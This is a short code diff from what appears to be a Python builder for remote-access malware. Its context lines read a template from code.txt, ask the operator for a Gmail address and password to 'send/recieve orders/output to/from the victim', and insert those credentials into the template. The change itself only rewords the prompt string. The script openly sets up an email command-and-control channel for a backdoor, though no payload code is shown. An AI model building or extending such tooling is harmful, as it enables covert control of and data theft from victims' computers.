@@ -18,7 +18,7 @@ def randomCommentGenerator():
 
 f=open("code.txt",'r')
 code=f.read()
-email=input("Enter the Email address you want to use to send/recieve orders/output to/from the victim: \n Use a gmail and enable less it's less secure features")
+email=input("Enter the Email address you want to use to send/recieve orders/output to/from the victim: \n Use a gmail and enable it's less secure applications features")
 password=input("Enter your Email password: ")
 code=code.replace("Email_Address",email)
 code=code.replace("Email_Password",password)
